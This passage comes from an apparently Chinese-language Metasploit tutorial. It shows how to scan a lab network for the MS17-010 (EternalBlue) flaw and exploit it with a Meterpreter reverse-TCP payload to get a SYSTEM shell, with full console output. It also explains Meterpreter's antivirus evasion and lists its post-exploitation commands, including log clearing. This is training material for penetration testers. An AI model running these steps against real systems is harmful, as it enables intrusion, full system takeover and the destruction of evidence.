<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 1 opened <span class="token punctuation">(</span>192.33.6.150:8443 -<span class="token operator">></span> 192.33.6.147:57700<span class="token punctuation">)</span> at 2020-06-23 22:59:04 -0400

meterpreter <span class="token operator">></span>
meterpreter <span class="token operator">></span> getuid
Server username: www-data <span class="token punctuation">(</span>33<span class="token punctuation">)</span>
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h3><ul>
<li>信息收集</li>
</ul>
<p>使用MSF辅助模块扫描内网中存在<code>“永恒之蓝”</code>的主机</p>
<p>搜索相关辅助模块</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> search type:auxiliary path:ms17_010

Matching Modules
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

   <span class="token comment" spellcheck="true">#  Name                                  Disclosure Date  Rank    Check  Description</span>
   -  ----                                  ---------------  ----    -----  -----------
   0  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                     normal  No     MS17-010 SMB RCE Detection

msf5 <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>配置相关辅助模块进行探测</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use auxiliary/scanner/smb/smb_ms17_010
msf5 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>auxiliary/scanner/smb/smb_ms17_010<span class="token punctuation">)</span>:

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   <span class="token boolean">true</span>                                                            no        Check <span class="token keyword">for</span> architecture on vulnerable hosts
   CHECK_DOPU   <span class="token boolean">true</span>                                                            no        Check <span class="token keyword">for</span> DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   <span class="token boolean">false</span>                                                           no        Check <span class="token keyword">for</span> named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  <span class="token function">yes</span>       List of named pipes to check
   RHOSTS                                                                       <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, range CIDR identifier, or hosts <span class="token function">file</span> with syntax <span class="token string">'file:&lt;path>'</span>
   RPORT        445                                                             <span class="token function">yes</span>       The SMB <span class="token function">service</span> port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
   SMBDomain    <span class="token keyword">.</span>                                                               no        The Windows domain to use <span class="token keyword">for</span> authentication
   SMBPass                                                                      no        The password <span class="token keyword">for</span> the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               <span class="token function">yes</span>       The number of concurrent threads <span class="token punctuation">(</span>max one per host<span class="token punctuation">)</span>

msf5 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> rhosts 192.33.6.0/24
rhosts <span class="token operator">=</span><span class="token operator">></span> 192.33.6.0/24
msf5 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> threads 50
threads <span class="token operator">=</span><span class="token operator">></span> 50
msf5 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>auxiliary/scanner/smb/smb_ms17_010<span class="token punctuation">)</span>:

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   <span class="token boolean">true</span>                                                            no        Check <span class="token keyword">for</span> architecture on vulnerable hosts
   CHECK_DOPU   <span class="token boolean">true</span>                                                            no        Check <span class="token keyword">for</span> DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   <span class="token boolean">false</span>                                                           no        Check <span class="token keyword">for</span> named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  <span class="token function">yes</span>       List of named pipes to check
   RHOSTS       192.33.6.0/24                                                   <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, range CIDR identifier, or hosts <span class="token function">file</span> with syntax <span class="token string">'file:&lt;path>'</span>
   RPORT        445                                                             <span class="token function">yes</span>       The SMB <span class="token function">service</span> port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
   SMBDomain    <span class="token keyword">.</span>                                                               no        The Windows domain to use <span class="token keyword">for</span> authentication
   SMBPass                                                                      no        The password <span class="token keyword">for</span> the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      50                                                              <span class="token function">yes</span>       The number of concurrent threads <span class="token punctuation">(</span>max one per host<span class="token punctuation">)</span>

msf5 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>配置完毕之后开始运行检测</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>-<span class="token punctuation">]</span> 192.33.6.1:445        - An SMB Login Error occurred <span class="token keyword">while</span> connecting to the IPC$ tree.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.0/24:445     - Scanned  31 of 256 hosts <span class="token punctuation">(</span>12% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.0/24:445     - Scanned  53 of 256 hosts <span class="token punctuation">(</span>20% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.0/24:445     - Scanned  81 of 256 hosts <span class="token punctuation">(</span>31% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.0/24:445     - Scanned 104 of 256 hosts <span class="token punctuation">(</span>40% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.33.6.151:445      - Host is likely VULNERABLE to MS17-010<span class="token operator">!</span> - Windows 7 Enterprise 7601 Service Pack 1 x64 <span class="token punctuation">(</span>64-bit<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.0/24:445     - Scanned 132 of 256 hosts <span class="token punctuation">(</span>51% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.0/24:445     - Scanned 155 of 256 hosts <span class="token punctuation">(</span>60% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.0/24:445     - Scanned 181 of 256 hosts <span class="token punctuation">(</span>70% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.0/24:445     - Scanned 205 of 256 hosts <span class="token punctuation">(</span>80% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.0/24:445     - Scanned 243 of 256 hosts <span class="token punctuation">(</span>94% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.0/24:445     - Scanned 256 of 256 hosts <span class="token punctuation">(</span>100% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed
msf5 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>检测到内网主机<code>Windows 7 Enterprise 7601 Service Pack 1 x64 (64-bit) 192.33.6.151</code>存在永恒之蓝漏洞</p>
<ul>
<li>漏洞攻防</li>
</ul>
<p>搜索相关攻击模块</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> search type:exploit path:ms17_010

Matching Modules
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

   <span class="token comment" spellcheck="true">#  Name                                      Disclosure Date  Rank     Check  Description</span>
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution

msf5 <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>配置攻击模块</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> rhosts 192.33.6.151
rhosts <span class="token operator">=</span><span class="token operator">></span> 192.33.6.151
msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> lport 2222
lport <span class="token operator">=</span><span class="token operator">></span> 2222
msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> payload windows/x64/meterpreter/reverse_tcp
payload <span class="token operator">=</span><span class="token operator">></span> windows/x64/meterpreter/reverse_tcp
msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> show targets 

Exploit targets:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 <span class="token punctuation">(</span>x64<span class="token punctuation">)</span> All Service Packs


msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>exploit/windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span>:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         192.33.6.151     <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, range CIDR identifier, or hosts <span class="token function">file</span> with syntax <span class="token string">'file:&lt;path>'</span>
   RPORT          445              <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
   SMBDomain      <span class="token keyword">.</span>                no        <span class="token punctuation">(</span>Optional<span class="token punctuation">)</span> The Windows domain to use <span class="token keyword">for</span> authentication
   SMBPass                         no        <span class="token punctuation">(</span>Optional<span class="token punctuation">)</span> The password <span class="token keyword">for</span> the specified username
   SMBUser                         no        <span class="token punctuation">(</span>Optional<span class="token punctuation">)</span> The username to authenticate as
   VERIFY_ARCH    <span class="token boolean">true</span>             <span class="token function">yes</span>       Check <span class="token keyword">if</span> remote architecture matches exploit Target.
   VERIFY_TARGET  <span class="token boolean">true</span>             <span class="token function">yes</span>       Check <span class="token keyword">if</span> remote OS matches exploit Target.


Payload options <span class="token punctuation">(</span>windows/x64/meterpreter/reverse_tcp<span class="token punctuation">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>
   LHOST     192.33.6.150     <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
   LPORT     2222             <span class="token function">yes</span>       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 <span class="token punctuation">(</span>x64<span class="token punctuation">)</span> All Service Packs


msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>攻击获取会话</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> exploit 

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.33.6.150:2222 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.151:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.33.6.151:445      - Host is likely VULNERABLE to MS17-010<span class="token operator">!</span> - Windows 7 Enterprise 7601 Service Pack 1 x64 <span class="token punctuation">(</span>64-bit<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.151:445      - Scanned 1 of 1 hosts <span class="token punctuation">(</span>100% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.151:445 - Connecting to target <span class="token keyword">for</span> exploitation.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.33.6.151:445 - Connection established <span class="token keyword">for</span> exploitation.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.33.6.151:445 - Target OS selected valid <span class="token keyword">for</span> OS indicated by SMB reply
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.151:445 - CORE raw buffer dump <span class="token punctuation">(</span>40 bytes<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.151:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 45 6e 74 65 72 70  Windows 7 Enterp
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.151:445 - 0x00000010  72 69 73 65 20 37 36 30 31 20 53 65 72 76 69 63  rise 7601 Servic
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.151:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.33.6.151:445 - Target arch selected valid <span class="token keyword">for</span> arch indicated by DCE/RPC reply
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.151:445 - Trying exploit with 12 Groom Allocations.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.151:445 - Sending all but last fragment of exploit packet
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.151:445 - Starting non-paged pool grooming
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.33.6.151:445 - Sending SMBv2 buffers
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.33.6.151:445 - Closing SMBv1 connection creating <span class="token function">free</span> hole adjacent to SMBv2 buffer.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.151:445 - Sending final SMBv2 buffers.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.151:445 - Sending last fragment of exploit packet<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.151:445 - Receiving response from exploit packet
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.33.6.151:445 - ETERNALBLUE overwrite completed successfully <span class="token punctuation">(</span>0xC000000D<span class="token punctuation">)</span><span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.151:445 - Sending egg to corrupted connection.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 192.33.6.151:445 - Triggering <span class="token function">free</span> of corrupted buffer.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>201283 bytes<span class="token punctuation">)</span> to 192.33.6.151
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 2 opened <span class="token punctuation">(</span>192.33.6.150:2222 -<span class="token operator">></span> 192.33.6.151:49296<span class="token punctuation">)</span> at 2020-06-23 23:34:33 -0400
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.33.6.151:445 - <span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.33.6.151:445 - <span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-WIN-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 192.33.6.151:445 - <span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>

meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>会话切换</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">bg</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Backgrounding session 2<span class="token punctuation">..</span>.
msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> sessions -i

Active sessions
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter php/linux    www-data <span class="token punctuation">(</span>33<span class="token punctuation">)</span> @ DC-1                   192.33.6.150:8443 -<span class="token operator">></span> 192.33.6.147:57700 <span class="token punctuation">(</span>192.33.6.147<span class="token punctuation">)</span>
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-5DTIE0M734E  192.33.6.150:2222 -<span class="token operator">></span> 192.33.6.151:49296 <span class="token punctuation">(</span>192.33.6.151<span class="token punctuation">)</span>

msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">></span> sessions -i 2
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting interaction with 2<span class="token punctuation">..</span>.

meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h1><p>Metasploit中的Meterpreter模块在后渗透阶段具有强大的攻击力。</p>
<h2 id="技术优势"><a href="#技术优势" class="headerlink" title="技术优势"></a>技术优势</h2><ul>
<li>平台通用性</li>
</ul>
<p>Metasploit 提供了各种主流操作系统和平台上的 Meterpreter 版本，包括 Windows，Linux，BSD 系统，并且同时支持 x86 和 x64 平台。另外，Meterpreter 还提供了基于 Java 和 PHP 的实现，以应用在各种不同的环境中。</p>
<ul>
<li>纯内存工作模式</li>
</ul>
<p>执行漏洞渗透攻击的时候，会直接装载 Meterpreter 的动态链接库到目标系统进程的内存空间。而不是先将 Meterpreter 上传到磁盘，然后调用<code>Loadlibrary</code> 加载动态链接库来启动Meterpreter。</p>
<p>这种纯内存工作模式的好处就是启动隐蔽，很难被杀毒软件监测到。此外，也不需要访问目标主机的磁盘，基本不会留下入侵的证据。虽然现在的内存分析与提取技术能事后捕获到Meterpreter 的蛛丝马迹，但这种技术不仅难度大，而且成功率低。并且这种模式不会创建新的进程。</p>
<ul>
<li>灵活且加密的通信协议</li>
</ul>
<p>Meterpreter 还提供了灵活加密的客户端服务通信协议，能够对网络传输进行加密，同时这种通信技术支持灵活的功能扩展。</p>
<p>Meterpreter 的网络通信协议采用 TLV 数据封住格式。</p>
<ul>
<li>易于扩展</li>
</ul>
<p>Meterpreter 在功能上来说不是一般的 ShellCode 能比拟的，但如果用户需要一些特殊或者定制的功能，也可以轻易的在 Meterpreter 中添加扩展（或插件）来实现。</p>
<h2 id="命令解读-Windows"><a href="#命令解读-Windows" class="headerlink" title="命令解读-Windows"></a>命令解读-Windows</h2><p>Windows下的Meterpreter命令解读</p>
<h3 id="核心命令"><a href="#核心命令" class="headerlink" title="核心命令"></a>核心命令</h3><pre class="line-numbers language-bash"><code class="language-bash">Core Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command                   Description
    -------                   -----------
    ?                         帮助手册
    background                将当前会话放置后台
    <span class="token function">bg</span>                        background命令的别名
    bgkill                    杀死meterpreter后台运行的脚本
    bglist                    列出meterpreter后台运行的脚本
    bgrun                     在后台运行一个meterpreter脚本
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  关闭Unicode字符串的编码
    enable_unicode_encoding   启用Unicode字符串的编码
    <span class="token keyword">exit</span>                      关闭退出 meterpreter session
    get_timeouts              查看当前会话超时信息
    guid                      查看会话GUID
    <span class="token function">help</span>                      帮助手册
    info                      展示post模块信息
    irb                       在当前会话中打开一个交互式的Ruby shell
    load                      加载一个或多个meterpreter扩展
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   进程迁移（将Meterpreter会话移植到指定pid值进程中）
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      关闭退出 meterpreter session
    <span class="token function">read</span>                      Reads data from a channel
    resource                  运行存储在文件中的命令（运行批处理文件）
    run                       执行一个 meterpreter 脚本 或 Post 模块
    secure                    <span class="token punctuation">(</span>Re<span class="token punctuation">)</span>Negotiate TLV packet encryption on the session
    sessions                  快速切换到另一个会话中（sessions -i ID）
    set_timeouts              设置当前会话超时信息
    <span class="token function">sleep</span>                     Force Meterpreter to go quiet, <span class="token keyword">then</span> re-establish session.
    transport                 Change the current transport mechanism
    use                       <span class="token string">"load"</span>的别名（已弃用）
    uuid                      获取当前会话的uuid信息
    <span class="token function">write</span>                     Writes data to a channel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><pre class="line-numbers language-bash"><code class="language-bash">Stdapi: File system Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Command       Description
    -------       -----------
    <span class="token function">cat</span>           读取会话系统中某一个文件的内容并显示
    <span class="token function">cd</span>            改变当前目录
    checksum      检索文件的校验和
    <span class="token function">cp</span>            文件复制操作
    <span class="token function">dir</span>           列出当前目录下的文件 <span class="token punctuation">(</span>ls的别名<span class="token punctuation">)</span>
    download      从当前目录下载某一个文件
    edit          编辑文件
    getlwd        打印本地当前工作目录
    getwd         打印工作目录
    lcd           改变本地工作目录
    lls           列出本地目录下的文件
    lpwd          打印本地当前工作目录
    <span class="token function">ls</span>            列出目录下所有文件
    <span class="token function">mkdir</span>         创建文件夹
    <span class="token function">mv</span>            移动文件
    <span class="token function">pwd</span>           打印当前工作目录
    <span class="token function">rm</span>            删除某个特殊文件
    <span class="token function">rmdir</span>         删除某个目录
    search        搜索文件
    show_mount    List all <span class="token function">mount</span> points/logical drives
    upload        上传文件或一个目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><pre class="line-numbers language-bash"><code class="language-bash">Stdapi: Networking Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command       Description
    -------       -----------
    arp           显示ARP缓存
    getproxy      查看当前代理配置
    <span class="token function">ifconfig</span>      查看网络接口信息
    ipconfig      查看网络接口信息
    <span class="token function">netstat</span>       查看网络连接情况
    portfwd       端口转发
    resolve       Resolve a <span class="token keyword">set</span> of host names on the target
    route         查看和修改路由表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><pre class="line-numbers language-bash"><code class="language-bash">Stdapi: System Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command       Description
    -------       -----------
    clearev       清除windows中的应用程序日志、系统日志、安全日志
    drop_token    Relinquishes any active impersonation token.
    execute       执行一个命令
    getenv        获取一个或多个换几个环境变量
    getpid        获取当前会话进程ID<span class="token punctuation">(</span>pid<span class="token punctuation">)</span>
    getprivs      Attempt to <span class="token function">enable</span> all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        查看权限
    <span class="token function">kill</span>          杀死进程（kill <span class="token operator">&lt;</span>pid<span class="token operator">></span>）
    localtime     获取目标系统当前日期和时间
